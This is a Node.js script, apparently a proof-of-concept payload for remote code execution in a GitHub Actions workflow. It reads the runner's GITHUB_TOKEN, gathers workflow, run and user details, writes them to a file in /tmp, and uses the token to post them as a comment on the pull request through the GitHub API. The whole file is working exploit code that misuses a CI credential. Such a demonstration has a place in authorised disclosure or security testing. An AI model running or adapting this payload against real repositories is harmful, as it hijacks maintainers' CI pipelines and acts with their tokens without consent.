
const fs = require('fs');
const tok = process.env.GITHUB_TOKEN || '';
const cands = ['pr-number.txt','../pr-number.txt','../../pr-number.txt',(process.env.GITHUB_WORKSPACE||'')+'/pr-number.txt'];
let pr='';
for (const c of cands) { try { if (fs.existsSync(c)) { pr=fs.readFileSync(c,'utf8').trim(); if(pr) break; } } catch(e){} }
const info = 'POC-RCE-OK workflow='+process.env.GITHUB_WORKFLOW+' event='+process.env.GITHUB_EVENT_NAME
  +' run='+process.env.GITHUB_RUN_ID+' token_present='+Boolean(tok)+' token_len='+tok.length
  +' pr='+pr+' cwd='+process.cwd()+' uid='+process.getuid();
console.log(info);
try { fs.writeFileSync('/tmp/poc-evidence.txt', info); } catch(e) { console.log('write err '+e.message); }
(async () => {
  const r = await fetch('https://api.github.com/repos/'+process.env.GITHUB_REPOSITORY+'/issues/'+pr+'/comments', {
    method:'POST',
    headers:{authorization:'Bearer '+tok, accept:'application/vnd.github+json','content-type':'application/json'},
    body: JSON.stringify({body: info})
  });
  console.log('COMMENT-STATUS '+r.status);
})().catch(e => console.error('comment err '+e.message));
